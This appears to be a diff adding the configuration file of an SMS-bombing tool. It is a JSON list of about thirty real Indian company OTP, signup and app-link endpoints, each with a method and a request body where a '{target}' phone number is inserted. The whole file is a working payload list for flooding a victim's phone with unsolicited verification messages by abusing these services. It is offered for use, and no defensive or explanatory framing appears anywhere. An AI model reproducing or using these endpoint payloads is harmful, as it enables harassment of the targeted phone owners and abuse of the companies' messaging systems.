@@ -1,0 +1,249 @@
+{
+  "sms": {
+    "91": [
+      {
+        "name": "Vedantu",
+        "url": "https://user.vedantu.com/user/preLoginVerification",
+        "method": "POST",
+        "data": {
+          "email": "null",
+          "event": "NEW_FLOW",
+          "phoneCode": "+91",
+          "phoneNumber": "{target}"
+        }
+      },
+      {
+        "name": "logistics",
+        "url": "https://cargo.apsrtconline.in/api/customer//cust/fetchOtp",
+        "method": "POST",
+        "data": {
+          "mobileNumber": "{target}"
+        }
+      },
+      {
+        "name": "scapia",
+        "url": "https://api.scapia.in/api/sendOTP",
+        "method": "POST",
+        "data": {
+          "phoneNumber": "{target}",
+          "flow": "SIGNUP",
+          "name": "harini aman",
+          "firstName": "harini",
+          "lastName": "aman"
+        }
+      },
+      {
+        "name": "proptiger",
+        "url": "https://www.proptiger.com/responsive/send-otp",
+        "method": "POST",
+        "data": {
+          "contactNumber": "{target}",
+          "domainId": "2"
+        }
+      },
+      {
+        "name": "NextGurukul",
+        "url": "https://www.nextgurukul.in/nlp/nlp/register",
+        "method": "POST",
+        "data": {
+          "action": "register",
+          "username": "{target}",
+          "phone": "{target}",
+          "source": "WEB"
+        }
+      },
+      {
+        "name": "ramfinecorp",
+        "url": "https://loan-api.ramfincorp.com/customers/customer-login-byMobile?utm_source=Performance_Max_Custom_Audience",
+        "method": "POST",
+        "data": {
+          "mobile": "{target}"
+        }
+      },
+      {
+        "name": "kredbee",
+        "url": "https://api.kreditbee.in/v1/me/otp",
+        "method": "POST",
+        "data": {
+          "reason": "loginOrRegister",
+          "mobile": "{target}"
+        }
+      },
+      {
+        "name": "truval",
+        "url": "https://www.marutisuzukitruevalue.com/api/sitecore/Forms/ResendOTP",
+        "method": "POST",
+        "data": {
+          "MobileNumber": "{target}",
+          "name": ""
+        }
+      },
+      {
+        "name": "billtron",
+        "url": "https://smsmediaapi.hellopatna.com/api/billtron/signup/check-mobile",
+        "method": "POST",
+        "data": {
+          "mobile": "{target}"
+        }
+      },
+      {
+        "name": "eurekaforbes",
+        "url": "https://www.eurekaforbes.com/api/public/ecom/v1/otp/send",
+        "method": "POST",
+        "data": {
+          "mobile_number": "{target}"
+        }
+      },
+      {
+        "name": "HealthKart",
+        "url": "https://www.healthkart.com/veronica/user/validate/1/{target}/signup?plt=1&st=1",
+        "method": "GET",
+        "data": {}
+      },
+      {
+        "name": "boat",
+        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
+        "method": "POST",
+        "data": {
+          "phone": "{target}",
+          "country": "IN"
+        }
+      },
+      {
+        "name": "licious",
+        "url": "https://www.licious.in/api/login/signup",
+        "method": "POST",
+        "data": {
+          "phone": "{target}",
+          "captcha_token": ""
+        }
+      },
+      {
+        "name": "thedermaco",
+        "url": "https://auth.thedermaco.com/v1/auth/initiate-signup",
+        "method": "POST",
+        "data": {
+          "mobile": "{target}",
+          "referralCode": ""
+        }
+      },
+      {
+        "name": "gonoise",
+        "url": "https://app-eks.gonoise.com/website/v2/create/otp",
+        "method": "POST",
+        "data": {
+          "value": "{target}",
+          "type": "phone"
+        }
+      },
+      {
+        "name": "freecharge",
+        "url": "https://www.freecharge.in/api/ims/rest/otp/send/login/signup",
+        "method": "POST",
+        "data": {
+          "mobileNumber": "{target}",
+          "fcChannel": 12
+        }
+      },
+      {
+        "name": "allensolly",
+        "url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
+        "method": "POST",
+        "data": {
+          "mobileoremail": "{target}",
+          "name": "markluther"
+        }
+      },
+      {
+        "name": "housing",
+        "url": "https://login.housing.com/api/v2/send-otp",
+        "method": "POST",
+        "data": {
+          "phone": "{target}"
+        }
+      },
+      {
+        "name": "cityflo",
+        "url": "https://cityflo.com/website-app-download-link-sms/",
+        "method": "POST",
+        "data": {
+          "mobile_number": "{target}"
+        }
+      },
+      {
+        "name": "unacademy",
+        "url": "https://unacademy.com/api/v1/user/get_app_link/",
+        "method": "POST",
+        "data": {
+          "phone": "{target}"
+        }
+      },
+      {
+        "name": "treebo",
+        "url": "https://www.treebo.com/api/v2/auth/login/otp/",
+        "method": "POST",
+        "data": {
+          "phone_number": "{target}"
+        }
+      },
+      {
+        "name": "pharmeasy",
+        "url": "https://pharmeasy.in/api/auth/requestOTP",
+        "method": "POST",
+        "data": {}
+      },
+      {
+        "name": "cashify",
+        "url": "https://www.cashify.in/api/cu01/v1/app-link",
+        "method": "GET",
+        "data": {
+          "mn": "{target}"
+        }
+      },
+      {
+        "name": "user",
+        "url": "https://user.vedantu.com/user/resendPreLoginVerificationOTP",
+        "method": "POST",
+        "data": {}
+      },
+      {
+        "name": "loans-api",
+        "url": "https://loans-api.ramfincorp.com/event-funnel/save-thirdParty-fe-events",
+        "method": "POST",
+        "data": {}
+      },
+      {
+        "name": "muscleblaze",
+        "url": "https://www.muscleblaze.com/veronica/user/login/send/otp/9/{target}?trkSrc=HM-LPOPUP&forgotPassword=false&plt=1&st=9",
+        "method": "GET",
+        "data": {}
+      },
+      {
+        "name": "nutrabay",
+        "url": "https://nutrabay.com/api/on-boarding/otp",
+        "method": "POST",
+        "data": {
+          "email_or_mobile": "{target}",
+          "c_code": "+91",
+          "type": "login"
+        }
+      },
+      {
+        "name": "dashboard",
+        "url": "https://dashboard.razorpay.com/graph",
+        "method": "POST",
+        "data": {}
+      },
+      {
+        "name": "admissions",
+        "url": "https://admissions.tcet.edu.in/web/apis/sendOtp",
+        "method": "POST",
+        "data": {
+          "phone": "{target}",
+          "requestCount": 0,
+          "sessionKey": ""
+        }
+      }
+    ]
+  }
+}
